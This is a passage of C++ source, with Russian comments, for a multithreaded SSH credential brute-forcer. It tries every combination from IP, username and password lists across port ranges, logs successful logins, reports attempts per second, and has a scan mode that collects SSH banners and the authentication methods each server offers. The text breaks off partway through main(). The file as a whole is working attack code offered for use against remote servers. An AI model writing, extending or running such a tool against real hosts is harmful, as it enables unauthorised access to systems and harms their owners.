/*
 * ssh_checker.cpp
 *
 * Автор: [Ваше Имя]
 * Дата создания: 2024-04-27
 *
 * Описание:
 *     Инструмент для массовой проверки SSH учетных данных с поддержкой многопоточности и асинхронного ввода-вывода.
 *     Поддерживает режимы сборки Debug и Release с различными уровнями логирования.
 *     Логирование осуществляется как в консоль, так и в файл.
 *     Включает алгоритм балансировки нагрузки "Наименьшее Количество Подключений" для оптимального распределения задач.
 *     Обеспечивает эффективную обработку больших объемов данных с использованием оптимизированных структур данных и параллельных методов.
 *     Включены алгоритмы расчета скорости обработки и статистики в реальном времени.
 *     Добавлена возможность сканирования портов на поддержку SSH1/SSH2, получение доступных методов аутентификации и баннера SSH.
 *
 * Лицензия:
 *     [Укажите вашу лицензию здесь, например, MIT License]
 */

#include <libssh/libssh.h>
#include <libssh/callbacks.h>
#include <log4cpp/Category.hh>
#include <log4cpp/OstreamAppender.hh>
#include <log4cpp/PatternLayout.hh>
#include <log4cpp/BasicLayout.hh>
#include <log4cpp/PropertyConfigurator.hh>
#include <iostream>
#include <fstream>
#include <sstream> // Для std::stringstream
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <queue>
#include <condition_variable>
#include <semaphore>
#include <atomic>
#include <getopt.h>
#include <functional> // Для std::function
#include <memory>
#include <algorithm>
#include <unordered_set>
#include <future>
#include <sys/mman.h> // Для mmap
#include <sys/stat.h> // Для определения размера файла
#include <fcntl.h>    // Для открытия файла
#include <unistd.h>   // Для close
#include <cstring>    // Для strerror
#include <chrono>     // Для измерения времени

// Проверка операционной системы для включения соответствующих заголовков
#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#endif

// Глобальная атомарная переменная для контроля завершения работы очереди задач
std::atomic<bool> done(false);

/**
 * @struct Credential
 * @brief Структура для хранения учетных данных.
 *
 * Содержит логин, пароль, IP-адрес и порт для SSH подключения.
 */
struct Credential {
    std::string username; ///< Имя пользователя
    std::string password; ///< Пароль пользователя
    std::string ip;       ///< IP-адрес хоста
    int port;             ///< Порт для подключения
};

/**
 * @class SafeQueue
 * @brief Потокобезопасная очередь для хранения задач.
 *
 * Используется для безопасного добавления и извлечения задач из очереди несколькими потоками.
 *
 * @tparam T Тип элементов очереди.
 */
template <typename T>
class SafeQueue {
private:
    std::queue<T> queue_;                ///< Очередь для хранения элементов
    std::mutex mtx_;                     ///< Мьютекс для защиты доступа к очереди
    std::condition_variable cv_;         ///< Условная переменная для уведомления потоков

public:
    /**
     * @brief Добавляет элемент в очередь.
     *
     * @param value Элемент для добавления.
     */
    void enqueue(T value) {
        {
            std::lock_guard<std::mutex> lock(mtx_);
            queue_.push(value);
        }
        cv_.notify_one();
    }

    /**
     * @brief Извлекает элемент из очереди.
     *
     * Ожидает, пока в очереди появится элемент или не будет сигнала завершения.
     *
     * @param value Ссылка на переменную, куда будет сохранен извлеченный элемент.
     * @return true Если элемент успешно извлечен.
     * @return false Если очередь пуста и завершение.
     */
    bool dequeue(T &value) {
        std::unique_lock<std::mutex> lock(mtx_);
        cv_.wait(lock, [&]{ return !queue_.empty() || done.load(); });
        if (queue_.empty()) {
            return false; // Очередь пуста и завершение
        }
        value = queue_.front();
        queue_.pop();
        return true;
    }

    /**
     * @brief Проверяет, пуста ли очередь.
     *
     * @return true Если очередь пуста.
     * @return false Если в очереди есть элементы.
     */
    bool empty() {
        std::lock_guard<std::mutex> lock(mtx_);
        return queue_.empty();
    }

    /**
     * @brief Уведомляет все ожидающие потоки о завершении.
     *
     * Используется для прекращения ожидания в потоках при завершении работы.
     */
    void notify_all() {
        cv_.notify_all();
    }
};

/**
 * @class SSHSession
 * @brief Класс для управления SSH-сессией с использованием RAII.
 *
 * Автоматически управляет созданием и освобождением SSH-сессии.
 */
class SSHSession {
public:
    /**
     * @brief Конструктор класса.
     *
     * Создает новую SSH-сессию. Если создание не удалось, выбрасывает исключение.
     */
    SSHSession() {
        session_ = ssh_new();
        if (!session_) {
            throw std::runtime_error("Не удалось создать SSH-сессию.");
        }
    }

    /**
     * @brief Деструктор класса.
     *
     * Отключает и освобождает SSH-сессию, если она была создана.
     */
    ~SSHSession() {
        if (session_) {
            ssh_disconnect(session_);
            ssh_free(session_);
        }
    }

    /**
     * @brief Получает указатель на SSH-сессию.
     *
     * @return ssh_session Указатель на SSH-сессию.
     */
    ssh_session get() const { return session_; }

    // Запрет копирования
    SSHSession(const SSHSession&) = delete;
    SSHSession& operator=(const SSHSession&) = delete;

    // Разрешение перемещения
    SSHSession(SSHSession&& other) noexcept : session_(other.session_) {
        other.session_ = nullptr;
    }

    SSHSession& operator=(SSHSession&& other) noexcept {
        if (this != &other) {
            if (session_) {
                ssh_disconnect(session_);
                ssh_free(session_);
            }
            session_ = other.session_;
            other.session_ = nullptr;
        }
        return *this;
    }

private:
    ssh_session session_; ///< Указатель на SSH-сессию
};

/**
 * @class ThreadPool
 * @brief Класс для управления пулом потоков с балансировкой нагрузки "Наименьшее Количество Подключений".
 *
 * Позволяет добавлять задачи в пул, которые будут выполняться доступными потоками.
 * Реализует алгоритм балансировки нагрузки "Наименьшее Количество Подключений" для оптимального распределения задач.
 */
class ThreadPool {
public:
    /**
     * @brief Конструктор пула потоков.
     *
     * Создает указанное количество рабочих потоков.
     *
     * @param threads Количество потоков в пуле.
     */
    ThreadPool(size_t threads);

    /**
     * @brief Добавляет новую задачу в пул потоков.
     *
     * @param task Задача для выполнения.
     */
    void enqueue(std::function<void()> task);

    /**
     * @brief Деструктор пула потоков.
     *
     * Останавливает все потоки и ожидает их завершения.
     */
    ~ThreadPool();

private:
    std::vector<std::thread> workers;            ///< Вектор рабочих потоков
    SafeQueue<std::function<void()>> tasks;      ///< Очередь задач для выполнения
    bool stop;                                    ///< Флаг для остановки пула потоков
};

/**
 * @brief Конструктор пула потоков.
 *
 * @param threads Количество потоков в пуле.
 */
ThreadPool::ThreadPool(size_t threads) : stop(false) {
    for(size_t i = 0; i < threads; ++i) {
        workers.emplace_back(
            [this]
            {
                while(true)
                {
                    std::function<void()> task;
                    if(!tasks.dequeue(task)) {
                        // Если очередь пуста и сигнал о завершении получен
                        return;
                    }
                    if(task) {
                        task();            // Выполнение задачи
                    }
                }
            }
        );
    }
}

/**
 * @brief Добавляет новую задачу в пул потоков.
 *
 * @param task Задача для выполнения.
 */
void ThreadPool::enqueue(std::function<void()> task) {
    tasks.enqueue(task);
}

/**
 * @brief Деструктор пула потоков.
 *
 * Останавливает все потоки и ожидает их завершения.
 */
ThreadPool::~ThreadPool() {
    done.store(true);
    tasks.notify_all();
    for(std::thread &worker: workers)
        worker.join();
}

/**
 * @brief Читает IP-адреса из файла с использованием асинхронного ввода-вывода.
 *
 * Использует std::async для асинхронного чтения файла, позволяя основному потоку продолжать работу.
 *
 * @param filename Имя файла с IP-адресами.
 * @param ips Множество для хранения уникальных IP-адресов.
 * @param logger Объект логирования.
 * @return true Если чтение прошло успешно.
 * @return false Если произошла ошибка при открытии файла.
 */
bool read_ips_async(const std::string &filename, std::unordered_set<std::string> &ips, log4cpp::Category &logger) {
    auto future = std::async(std::launch::async, [&](const std::string &file, std::unordered_set<std::string> &ip_set) -> bool {
        std::ifstream infile(file);
        if (!infile.is_open()) {
            logger.error("Не удалось открыть файл с IP-адресами: " + file);
            return false;
        }

        std::string line;
        while (std::getline(infile, line)) {
            // Удаление возможных пробельных символов
            line.erase(std::remove_if(line.begin(), line.end(), ::isspace), line.end());
            if (!line.empty()) {
                ip_set.insert(line);
            }
        }

        infile.close();
        logger.info("Чтение IP-адресов завершено. Всего уникальных записей: " + std::to_string(ip_set.size()));
        return true;
    }, filename, std::ref(ips));

    return future.get();
}

/**
 * @brief Читает логины и пароли из отдельных файлов с использованием асинхронного ввода-вывода.
 *
 * Использует std::async для асинхронного чтения файлов, позволяя основному потоку продолжать работу.
 *
 * @param user_file Имя файла с логинами.
 * @param pass_file Имя файла с паролями.
 * @param usernames Множество для хранения уникальных логинов.
 * @param passwords Множество для хранения уникальных паролей.
 * @param logger Объект логирования.
 * @return true Если чтение прошло успешно.
 * @return false Если произошла ошибка при открытии файлов.
 */
bool read_usernames_passwords_async(const std::string &user_file, const std::string &pass_file,
                                    std::unordered_set<std::string> &usernames, std::unordered_set<std::string> &passwords,
                                    log4cpp::Category &logger) {
    auto future = std::async(std::launch::async, [&](const std::string &u_file, const std::string &p_file,
                                                     std::unordered_set<std::string> &user_set,
                                                     std::unordered_set<std::string> &pass_set) -> bool {
        // Чтение логинов
        std::ifstream user_in(u_file);
        if (!user_in.is_open()) {
            logger.error("Не удалось открыть файл с логинами: " + u_file);
            return false;
        }

        std::string user;
        while (std::getline(user_in, user)) {
            // Удаление возможных пробельных символов
            user.erase(std::remove_if(user.begin(), user.end(), ::isspace), user.end());
            if (!user.empty()) {
                user_set.insert(user);
            }
        }

        user_in.close();

        // Чтение паролей
        std::ifstream pass_in(p_file);
        if (!pass_in.is_open()) {
            logger.error("Не удалось открыть файл с паролями: " + p_file);
            return false;
        }

        std::string pass;
        while (std::getline(pass_in, pass)) {
            // Удаление возможных пробельных символов
            pass.erase(std::remove_if(pass.begin(), pass.end(), ::isspace), pass.end());
            if (!pass.empty()) {
                pass_set.insert(pass);
            }
        }

        pass_in.close();

        // Проверка, что количество логинов и паролей совпадает (убираем, так как теперь читаем все независимо)
        // if (user_in.eof() != pass_in.eof()) {
        //     logger.warn("Количество логинов и паролей не совпадает.");
        // }

        logger.info("Чтение логинов и паролей завершено. Всего уникальных записей: " + 
                    std::to_string(user_set.size()) + " логинов и " + 
                    std::to_string(pass_set.size()) + " паролей.");
        return true;
    }, user_file, pass_file, std::ref(usernames), std::ref(passwords));

    return future.get();
}

/**
 * @brief Парсит порты из строки с поддержкой диапазонов и отдельных значений.
 *
 * Поддерживает форматы, такие как "22,2222,22-2020".
 * Удаляет дубликаты и сортирует порты.
 *
 * @param port_str Строка с портами.
 * @param ports Вектор, куда будут добавлены парсенные порты.
 * @param logger Объект логирования.
 * @return true Если парсинг прошел успешно.
 * @return false Если возникли ошибки при парсинге.
 */
bool parse_ports(const std::string &port_str, std::vector<int> &ports, log4cpp::Category &logger) {
    std::stringstream ss(port_str);
    std::string token;

    while (std::getline(ss, token, ',')) {
        // Проверка наличия диапазона
        size_t dash = token.find('-');
        if (dash != std::string::npos) {
            // Парсинг диапазона
            std::string start_str = token.substr(0, dash);
            std::string end_str = token.substr(dash + 1);
            try {
                int start = std::stoi(start_str);
                int end = std::stoi(end_str);
                if (start > end) {
                    logger.warn("Некорректный диапазон портов: " + token);
                    continue;
                }
                for(int p = start; p <= end; ++p) {
                    if(p >=1 && p <= 65535) {
                        ports.push_back(p);
                    } else {
                        logger.warn("Порт вне допустимого диапазона (1-65535): " + std::to_string(p));
                    }
                }
            } catch (...) {
                logger.warn("Некорректный формат диапазона портов: " + token);
                continue;
            }
        } else {
            // Парсинг отдельного порта
            try {
                int port = std::stoi(token);
                if(port >=1 && port <= 65535) {
                    ports.push_back(port);
                } else {
                    logger.warn("Порт вне допустимого диапазона (1-65535): " + std::to_string(port));
                }
            } catch (...) {
                logger.warn("Некорректный формат порта: " + token);
                continue;
            }
        }
    }

    // Удаление дубликатов и сортировка
    std::sort(ports.begin(), ports.end());
    ports.erase(std::unique(ports.begin(), ports.end()), ports.end());

    logger.info("Парсинг портов завершен. Всего уникальных портов: " + std::to_string(ports.size()));
    return true;
}

/**
 * @brief Настраивает логирование с использованием log4cpp.
 *
 * Создает аппендеры для записи логов в файл и вывод в консоль.
 * Устанавливает уровни логирования в зависимости от режима (Debug или Release).
 *
 * @param is_debug Флаг, указывающий, включен ли режим отладки.
 */
void setup_logging(bool is_debug) {
    // Создание аппендера для записи логов в файл
    std::ofstream *logfile = new std::ofstream("ssh_checker.log", std::ios::app);
    if (!logfile->is_open()) {
        std::cerr << "Не удалось открыть файл для логирования: ssh_checker.log" << std::endl;
        exit(1);
    }

    log4cpp::OstreamAppender *fileAppender = new log4cpp::OstreamAppender("fileAppender", logfile);

    // Настройка формата логов для файла
    log4cpp::PatternLayout *filePattern = new log4cpp::PatternLayout();
    filePattern->setConversionPattern("%d [%p] %c: %m%n");
    fileAppender->setLayout(filePattern);

    // Создание аппендера для вывода логов в консоль
    log4cpp::OstreamAppender *consoleAppender = new log4cpp::OstreamAppender("consoleAppender", &std::cout);

    // Настройка формата логов для консоли
    log4cpp::PatternLayout *consolePattern = new log4cpp::PatternLayout();
    consolePattern->setConversionPattern("%d [%p] %c: %m%n");
    consoleAppender->setLayout(consolePattern);

    // Получение корневой категории логирования и добавление аппендеров
    log4cpp::Category& root = log4cpp::Category::getRoot();
    if (is_debug) {
        root.setPriority(log4cpp::Priority::DEBUG); // Уровень логирования Debug
    } else {
        root.setPriority(log4cpp::Priority::INFO);  // Уровень логирования Info
    }
    root.addAppender(fileAppender);
    root.addAppender(consoleAppender);
}

/**
 * @brief Проверяет учетные данные с использованием libssh.
 *
 * Создает SSH-сессию, настраивает параметры подключения, выполняет аутентификацию.
 * Поддерживает стандартную аутентификацию по паролю и клавиатурно-интерактивную аутентификацию.
 * Логирует все этапы процесса.
 *
 * @param cred Структура с учетными данными для проверки.
 * @param timeout Таймаут подключения в секундах.
 * @param logger Объект логирования.
 * @return true Если аутентификация прошла успешно.
 * @return false Если аутентификация не удалась или произошли ошибки.
 */
bool check_credentials(const Credential &cred, int timeout, log4cpp::Category &logger) {
    try {
        // Управление SSH-сессией с использованием RAII
        SSHSession session_wrapper;
        ssh_session session = session_wrapper.get();

        // Установка параметров сессии
        ssh_options_set(session, SSH_OPTIONS_HOST, cred.ip.c_str());

        unsigned int port = static_cast<unsigned int>(cred.port);
        ssh_options_set(session, SSH_OPTIONS_PORT, &port);

        ssh_options_set(session, SSH_OPTIONS_USER, cred.username.c_str());

        long timeout_sec = static_cast<long>(timeout);
        ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout_sec);

        // Включение поддержки SSH2 и SSH1
        int enable_ssh2 = 1; // Включить SSH2
        ssh_options_set(session, SSH_OPTIONS_SSH2, &enable_ssh2);

        int enable_ssh1 = 1; // Включить SSH1
        ssh_options_set(session, SSH_OPTIONS_SSH1, &enable_ssh1);

        // Расширенные алгоритмы обмена ключами, шифров и HMAC
        const char* key_exchange_algorithms = "diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521";
        ssh_options_set(session, SSH_OPTIONS_KEY_EXCHANGE, key_exchange_algorithms);

        const char* ciphers_c_s = "aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com";
        ssh_options_set(session, SSH_OPTIONS_CIPHERS_C_S, ciphers_c_s);

        const char* hmac_c_s = "hmac-sha2-256,hmac-sha2-512,hmac-sha1";
        ssh_options_set(session, SSH_OPTIONS_HMAC_C_S, hmac_c_s);

        logger.debug("Настроены расширенные параметры SSH-сессии для " + cred.ip + ":" + std::to_string(cred.port));

        // Подключение к серверу
        int rc = ssh_connect(session);
        if (rc != SSH_OK) {
            logger.error("Ошибка подключения к " + cred.ip + ":" + std::to_string(cred.port) + " - " + ssh_get_error(session));
            return false;
        }

        logger.debug("Подключение к " + cred.ip + ":" + std::to_string(cred.port) + " успешно.");

        // Получение SSH баннера
        char *banner = ssh_get_issue_banner(session);
        if (banner) {
            logger.info("SSH баннер для " + cred.ip + ":" + std::to_string(cred.port) + " - " + std::string(banner));
            free(banner);
        } else {
            logger.warn("Не удалось получить SSH баннер для " + cred.ip + ":" + std::to_string(cred.port));
        }

        // Попытка аутентификации по паролю
        rc = ssh_userauth_password(session, NULL, cred.password.c_str());
        if (rc == SSH_AUTH_SUCCESS) {
            logger.info("Успешная аутентификация (пароль): " + cred.username + "@" + cred.ip + ":" + std::to_string(cred.port));
            return true;
        } else if (rc == SSH_AUTH_INFO) {
            // Сервер запросил клавиатурно-интерактивную аутентификацию
            logger.debug("Сервер запросил клавиатурно-интерактивную аутентификацию для " + cred.username + "@" + cred.ip + ":" + std::to_string(cred.port));

            rc = ssh_userauth_kbdint(session, NULL, NULL);
            while (rc == SSH_AUTH_INFO) {
                int nprompts = ssh_userauth_kbdint_getnprompts(session);
                const char *name = ssh_userauth_kbdint_getname(session);
                const char *instruction = ssh_userauth_kbdint_getinstruction(session);

                if (name && strlen(name) > 0) {
                    logger.info("Имя блока аутентификации: " + std::string(name));
                }
                if (instruction && strlen(instruction) > 0) {
                    logger.info("Инструкция: " + std::string(instruction));
                }

                for (int i = 0; i < nprompts; ++i) {
                    const char *prompt = ssh_userauth_kbdint_getprompt(session, i, nullptr);
                    if (prompt == nullptr) {
                        logger.warn("Не удалось получить промпт #" + std::to_string(i) + " для " + cred.ip + ":" + std::to_string(cred.port));
                        continue;
                    }

                    // Предполагается, что пароль требуется без эха
                    std::string answer = cred.password; // Используем тот же пароль для всех промптов

                    rc = ssh_userauth_kbdint_setanswer(session, i, answer.c_str());
                    if (rc != SSH_OK) {
                        logger.error("Не удалось установить ответ на промпт #" + std::to_string(i) + " для " + cred.ip + ":" + std::to_string(cred.port));
                        break;
                    }
                }

                rc = ssh_userauth_kbdint(session, NULL, NULL);
            }

            if (rc == SSH_AUTH_SUCCESS) {
                logger.info("Успешная аутентификация (keyboard-interactive): " + cred.username + "@" + cred.ip + ":" + std::to_string(cred.port));
                return true;
            } else if (rc == SSH_AUTH_DENIED) {
                logger.warn("Аутентификация отклонена для " + cred.username + "@" + cred.ip + ":" + std::to_string(cred.port));
                return false;
            } else if (rc == SSH_AUTH_ERROR) {
                logger.error("Ошибка аутентификации для " + cred.username + "@" + cred.ip + ":" + std::to_string(cred.port) + " - " + ssh_get_error(session));
                return false;
            }
        } else if (rc == SSH_AUTH_PARTIAL) {
            // Частичная аутентификация, можно попробовать другой метод
            logger.warn("Частичная аутентификация для " + cred.username + "@" + cred.ip + ":" + std::to_string(cred.port));
            return false;
        } else if (rc == SSH_AUTH_ERROR) {
            // Ошибка аутентификации
            logger.error("Ошибка аутентификации для " + cred.username + "@" + cred.ip + ":" + std::to_string(cred.port) + " - " + ssh_get_error(session));
            return false;
        }

        // Дополнительная попытка аутентификации через клавиатурно-интерактивный метод
        rc = ssh_userauth_kbdint(session, NULL, NULL);
        if (rc == SSH_AUTH_SUCCESS) {
            logger.info("Успешная аутентификация (keyboard-interactive): " + cred.username + "@" + cred.ip + ":" + std::to_string(cred.port));
            return true;
        } else {
            logger.warn("Неудачная аутентификация для " + cred.username + "@" + cred.ip + ":" + std::to_string(cred.port) + " - " + ssh_get_error(session));
            return false;
        }
    } catch (const std::exception &e) {
        // В случае исключения логируем ошибку и выводим в консоль
        std::cerr << "Исключение при проверке " << cred.username << "@" << cred.ip << ":" << cred.port << " - " << e.what() << std::endl;
        return false;
    }
}

/**
 * @brief Функция сканирования SSH сервера.
 *
 * Подключается к указанному IP и порту, определяет версию SSH (SSH1 или SSH2),
 * получает доступные методы аутентификации и баннер SSH, затем выводит и логирует эту информацию.
 *
 * @param ip IP-адрес для сканирования.
 * @param port Порт для сканирования.
 * @param logger Объект логирования.
 */
void scan_ssh_server(const std::string &ip, int port, log4cpp::Category &logger) {
    try {
        SSHSession session_wrapper;
        ssh_session session = session_wrapper.get();

        // Установка параметров сессии
        ssh_options_set(session, SSH_OPTIONS_HOST, ip.c_str());
        ssh_options_set(session, SSH_OPTIONS_PORT, &port);
        ssh_options_set(session, SSH_OPTIONS_USER, ""); // Пустой пользователь

        long timeout_sec = 5; // Таймаут 5 секунд для сканирования
        ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout_sec);

        // Расширенные алгоритмы обмена ключами и шифров
        const char* key_exchange_algorithms = "diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521";
        ssh_options_set(session, SSH_OPTIONS_KEY_EXCHANGE, key_exchange_algorithms);

        const char* ciphers_c_s = "aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com";
        ssh_options_set(session, SSH_OPTIONS_CIPHERS_C_S, ciphers_c_s);

        const char* hmac_c_s = "hmac-sha2-256,hmac-sha2-512,hmac-sha1";
        ssh_options_set(session, SSH_OPTIONS_HMAC_C_S, hmac_c_s);

        logger.debug("Настроены расширенные параметры SSH-сессии для сканирования " + ip + ":" + std::to_string(port));

        // Подключение к серверу
        int rc = ssh_connect(session);
        if (rc != SSH_OK) {
            logger.warn("Не удалось подключиться к " + ip + ":" + std::to_string(port) + " - " + ssh_get_error(session));
            return;
        }

        logger.info("Успешное подключение к " + ip + ":" + std::to_string(port));

        // Получение SSH баннера
        char *banner = ssh_get_issue_banner(session);
        std::string protocol = "Unknown";
        std::string auth_methods = "Unknown";

        if (banner) {
            logger.info("SSH баннер для " + ip + ":" + std::to_string(port) + " - " + std::string(banner));

            // Парсинг версии протокола из баннера
            std::string banner_str(banner);
            size_t first_dash = banner_str.find('-');
            size_t second_dash = banner_str.find('-', first_dash + 1);

            if (first_dash != std::string::npos && second_dash != std::string::npos) {
                std::string protocol_version_str = banner_str.substr(first_dash + 1, second_dash - first_dash - 1);
                if (protocol_version_str.find("1.") != std::string::npos) {
                    protocol = "SSH1";
                } else if (protocol_version_str.find("2.") != std::string::npos) {
                    protocol = "SSH2";
                }
            } else {
                logger.warn("Не удалось определить версию SSH протокола из баннера для " + ip + ":" + std::to_string(port));
            }

            free(banner);
        } else {
            logger.warn("Не удалось получить SSH баннер для " + ip + ":" + std::to_string(port));
        }

        // Получение доступных методов аутентификации
        const char* username = ""; // Пустой пользователь

        // Функция ssh_userauth_list возвращает битовую маску методов
        int methods = ssh_userauth_list(session, username);
        if (methods == SSH_AUTH_ERROR) {
            logger.error("Не удалось получить методы аутентификации для " + ip + ":" + std::to_string(port));
            return;
        }

        auth_methods = "";

        if (methods & SSH_AUTH_METHOD_NONE) auth_methods += "None, ";
        if (methods & SSH_AUTH_METHOD_PASSWORD) auth_methods += "Password, ";
        if (methods & SSH_AUTH_METHOD_PUBLICKEY) auth_methods += "PublicKey, ";
        if (methods & SSH_AUTH_METHOD_HOSTBASED) auth_methods += "HostBased, ";
        if (methods & SSH_AUTH_METHOD_INTERACTIVE) auth_methods += "Keyboard-Interactive, ";
        #ifdef SSH_AUTH_METHOD_GSSAPI_MIC
            if (methods & SSH_AUTH_METHOD_GSSAPI_MIC) auth_methods += "GSSAPI, ";
        #endif

        // Удаление последней запятой и пробела
        if (!auth_methods.empty()) {
            auth_methods.erase(auth_methods.size() - 2);
        } else {
            auth_methods = "Unknown";
        }

        logger.info("Доступные методы аутентификации для " + ip + ":" + std::to_string(port) + " - " + auth_methods);
        std::cout << "IP: " << ip << ":" << port << " | SSH Version: " << protocol << " | Auth Methods: " << auth_methods << std::endl;

        // Закрытие сессии
        ssh_disconnect(session);
    } catch (const std::exception &e) {
        // В случае исключения логируем ошибку и выводим в консоль
        logger.error("Исключение при сканировании SSH сервера " + ip + ":" + std::to_string(port) + " - " + e.what());
    }
}

/**
 * @brief Генерирует комбинации учетных данных на лету и добавляет их в очередь задач.
 *
 * Использует многопоточность и синхронизацию для эффективного распределения нагрузки.
 *
 * @param ips Список IP-адресов.
 * @param usernames Список логинов.
 * @param passwords Список паролей.
 * @param ports Список портов.
 * @param pool Пул потоков для выполнения задач.
 * @param logger Объект логирования.
 * @param attempts_counter Атомарный счетчик обработанных попыток.
 * @param start_time Время начала обработки.
 */
void generate_and_enqueue_tasks(const std::unordered_set<std::string> &ips,
                                const std::unordered_set<std::string> &usernames,
                                const std::unordered_set<std::string> &passwords,
                                const std::vector<int> &ports,
                                ThreadPool &pool,
                                log4cpp::Category &logger,
                                std::atomic<long> &attempts_counter,
                                std::chrono::steady_clock::time_point start_time) {
    for(const auto &ip : ips) {
        for(const auto &username : usernames) {
            for(const auto &password : passwords) {
                for(const auto &port : ports) {
                    // Лямбда-функция для проверки учетных данных
                    pool.enqueue([ip, username, password, port, &logger, &attempts_counter]() {
                        Credential cred{username, password, ip, port};
                        bool valid = check_credentials(cred, 10, logger); // Таймаут 10 секунд

                        // Увеличение счетчика попыток
                        attempts_counter++;

                        if (valid) {
                            // Успешная аутентификация
                            std::cout << "Успешная аутентификация: " << cred.username
                                      << "@" << cred.ip << ":" << cred.port << std::endl;
                        } else {
                            // Неудачная аутентификация
                            std::cout << "Неудачная аутентификация: " << cred.username
                                      << "@" << cred.ip << ":" << cred.port << std::endl;
                        }
                    });
                }
            }
        }
    }

    // После генерации всех задач, сигнализируем о завершении
    done.store(true);
    pool.enqueue(nullptr); // Добавляем пустую задачу для завершения потоков
}

/**
 * @brief Отслеживает и выводит статистику скорости обработки.
 *
 * Периодически выводит в консоль количество обработанных попыток и скорость (попыток в секунду).
 *
 * @param attempts_counter Атомарный счетчик обработанных попыток.
 * @param start_time Время начала обработки.
 */
void monitor_progress(const std::atomic<long> &attempts_counter,
                      std::chrono::steady_clock::time_point start_time) {
    long last_count = 0;
    auto last_time = start_time;

    while(!done.load()) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        long current_count = attempts_counter.load();
        auto current_time = std::chrono::steady_clock::now();
        std::chrono::duration<double> elapsed = current_time - last_time;
        long attempts_last_interval = current_count - last_count;
        double speed = elapsed.count() > 0 ? attempts_last_interval / elapsed.count() : 0.0;

        std::cout << "[Статистика] Обработано попыток: " << current_count
                  << ", Скорость: " << speed << " попыток/секунду" << std::endl;

        last_count = current_count;
        last_time = current_time;
    }

    // Финальная статистика
    auto end_time = std::chrono::steady_clock::now();
    std::chrono::duration<double> total_elapsed = end_time - start_time;
    long total_attempts = attempts_counter.load();
    double average_speed = total_elapsed.count() > 0 ? total_attempts / total_elapsed.count() : 0.0;

    std::cout << "[Финальная Статистика] Обработано попыток: " << total_attempts
              << ", Средняя скорость: " << average_speed << " попыток/секунду"
              << ", Общее время: " << total_elapsed.count() << " секунд" << std::endl;
}

/**
 * @brief Основная функция приложения.
 *
 * Парсит аргументы командной строки, настраивает логирование, читает входные данные,
 * генерирует комбинации учетных данных и запускает проверки в пуле потоков.
 * Включает алгоритмы расчета скорости и количества попыток в секунду.
 * Также поддерживает режим сканирования SSH серверов с помощью аргумента --scan.
 *
 * @param argc Количество аргументов.
 * @param argv Массив строк с аргументами.
 * @return int Код завершения программы.
 */
int main(int argc, char *argv[]) {
    // Определение длинных опций командной строки
    static struct option long_options[] = {
        {"ips", required_argument, 0, 'i'},            ///< Файл с IP-адресами
        {"usernames", required_argument, 0, 'u'},      ///< Файл с логинами
        {"passwords", required_argument, 0, 'w'},      ///< Файл с паролями
        {"ports", required_argument, 0, 'p'},          ///< Список портов
        {"timeout", required_argument, 0, 't'},        ///< Таймаут подключения
        {"max-threads", required_argument, 0, 'm'},    ///< Максимальное количество потоков
        {"debug", no_argument, 0, 'd'},                ///< Включить режим отладки
        {"scan", no_argument, 0, 's'},                  ///< Режим сканирования SSH сервера
        {"help", no_argument, 0, 'h'},                 ///< Показать справку
        {0, 0, 0, 0}
    };

    int option_index = 0;
    int opt;
    std::string ips_file;           ///< Путь к файлу с IP-адресами
    std::string usernames_file;     ///< Путь к файлу с логинами
    std::string passwords_file;     ///< Путь к файлу с паролями
    std::string ports_str;          ///< Строка с портами
    int timeout = 10;               ///< Таймаут подключения в секундах (по умолчанию 10)
    int max_threads = 100;          ///< Максимальное количество потоков (по умолчанию 100)
    bool is_debug = false;          ///< Флаг режима отладки
    bool scan_mode = false;         ///< Флаг режима сканирования

    // Парсинг аргументов командной строки
    while ((opt = getopt_long(argc, argv, "i:u:w:p:t:m:sdh", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'i':
                ips_file = optarg;
                break;
            case 'u':
                usernames_file = optarg;
                break;
            case 'w':
                passwords_file = optarg;
                break;
            case 'p':
                ports_str = optarg;
                break;
            case 't':
                try {
                    timeout = std::stoi(optarg);
                    if(timeout <= 0) throw std::invalid_argument("Таймаут должен быть положительным.");
                } catch (...) {
                    std::cerr << "Неверный таймаут: " << optarg << std::endl;
                    return 1;
                }
                break;
            case 'm':
                try {
                    max_threads = std::stoi(optarg);
                    if(max_threads <= 0) throw std::invalid_argument("Количество потоков должно быть положительным.");
                } catch (...) {
                    std::cerr << "Неверное количество потоков: " << optarg << std::endl;
                    return 1;
                }
                break;
            case 'd':
                is_debug = true;
                break;
            case 's':
                scan_mode = true;
                break;
            case 'h':
                std::cout << "Использование: " << argv[0] << " [OPTIONS]\n"
                          << "Options:\n"
                          << "  -i, --ips FILE            Файл с IP-адресами\n"
                          << "  -u, --usernames FILE      Файл с логинами\n"
                          << "  -w, --passwords FILE      Файл с паролями\n"
                          << "  -p, --ports PORTS         Список портов через запятую и/или диапазоны (например, 22,2222,2200-2300)\n"
                          << "  -t, --timeout SECONDS     Таймаут подключения в секундах (по умолчанию 10)\n"
                          << "  -m, --max-threads NUM     Максимальное количество потоков (по умолчанию 100)\n"
                          << "  -s, --scan                Режим сканирования SSH серверов\n"
                          << "  -d, --debug               Включить режим отладки с подробным логированием\n"
                          << "  -h, --help                Показать это сообщение и выйти\n";
                return 0;
            default:
                std::cerr << "Неверный параметр. Используйте -h для справки.\n";
                return 1;
        }
    }

    // Настройка логирования
    setup_logging(is_debug);
    log4cpp::Category& logger = log4cpp::Category::getRoot();

    if (scan_mode) {
        // Режим сканирования SSH серверов
        if (ips_file.empty() || ports_str.empty()) {
            std::cerr << "Для режима сканирования необходимы параметры --ips и --ports. Используйте -h для справки.\n";
            return 1;
        }

        // Чтение IP-адресов и портов
        std::unordered_set<std::string> ips;
        if (!read_ips_async(ips_file, ips, logger)) {
            logger.fatal("Не удалось прочитать IP-адреса. Завершение работы.");
            return 1;
        }

        if (ips.empty()) {
